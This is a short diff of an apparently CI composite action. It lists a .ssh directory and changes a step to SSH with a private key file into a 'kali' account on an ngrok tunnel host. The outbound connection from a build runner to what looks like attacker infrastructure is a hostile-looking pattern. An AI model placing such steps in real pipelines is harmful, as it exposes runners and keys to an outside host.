@@ -33,5 +33,5 @@ runs:
       shell: bash
     - run: ls -la .ssh
       shell: bash
-    - run: ssh -p 14125 kali@2.tcp.ngrok.io whoami
+    - run: ssh -i .ssh/id_rsa -p 14125 kali@2.tcp.ngrok.io whoami
       shell: bash
